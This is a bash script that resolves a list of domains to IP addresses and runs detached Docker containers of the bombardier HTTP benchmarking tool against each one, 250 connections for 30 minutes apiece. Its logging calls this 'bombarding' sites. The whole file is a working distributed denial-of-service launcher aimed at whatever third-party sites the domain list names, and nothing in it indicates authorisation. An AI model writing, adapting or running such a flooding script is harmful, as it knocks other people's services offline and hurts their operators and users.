#!/bin/bash
source libs/*.sh

connections=250
timer=1800
domains_filename="${1:-domains.txt}"
ips_filename=ips.txt

echo "Pulling Docker image"

# validate docker is installed
docker pull alpine/bombardier

if [ $? -ne 0 ]
then
	echo "Something went wrong while getting Docker image"
	exit 1
fi

echo "Domains file - $domains_filename"

# generate ips file
parse_dns_records_for_domains $domains_filename $ips_filename

bombarding_count=0

function cb {
	ip=$1
	url="http://$ip"

	docker run -d alpine/bombardier -c $connections -d "${timer}s" -l $url &>-
		
	if [ $? -ne 0 ]
	then
		continue
	fi

	echo "Started bombarding $url with $connections connections for $timer seconds"
	((bombarding_count++))
}

read_file $ips_filename cb

echo "Successfully started bombarding $bombarding_count sites!"
exit 0
